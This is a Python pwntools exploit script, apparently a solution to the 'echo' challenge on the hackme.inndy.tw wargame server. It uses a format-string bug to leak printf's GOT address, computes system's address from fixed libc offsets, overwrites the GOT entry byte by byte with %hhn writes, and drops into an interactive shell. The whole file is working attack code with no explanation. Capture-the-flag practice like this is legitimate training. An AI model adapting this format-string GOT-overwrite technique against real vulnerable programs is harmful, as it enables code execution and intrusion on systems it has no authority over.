from pwn import *

#p = process( './echo' )
p = remote( 'hackme.inndy.tw', 7711 )

def fmt( prev, val, idx ):
	result = b''
	if val > prev:
		result += b'%' + bytes( str( val - prev ), 'utf-8' ) + b'c'
	elif val == prev:
		result += b''
	else:
		result += b'%' + bytes( str( val - prev + 256 ), 'utf-8' ) + b'c'
	result += b'%' + bytes( str( idx ), 'utf-8' ) + b'$hhn'
	return result


#system_got = 0x0804a018
printf_got = 0x0804a010

payload = b'%8$s' + p32( printf_got )
p.sendline( payload )

printf_add = u32( p.recvuntil( '\n' )[:4] )
#print( hex( printf_add ) )

printf_off = 0x00049590
system_off = 0x0003ad80

system_add = printf_add - printf_off + system_off

print( hex( system_add ) )

payload = b''
prev = 0
for i in range( 4 ):
	payload += fmt( prev, ( system_add >> i * 8 ) & 0xff, 23 + i )
	prev = ( system_add >> i * 8 ) & 0xff
	#print( hex( prev ) )

#print( len( payload ) )

payload = payload.ljust( 0x40, b'a' ) + p32( printf_got ) + p32( printf_got+1 ) + p32(printf_got+2) + p32( printf_got+3 )
#payload = b'%23$p'.ljust( 0x40, b'a' ) + p32( printf_got )

#print( payload )

#raw_input()
p.sendline( payload )

#p.sendline( 'cat flag' )

p.interactive()
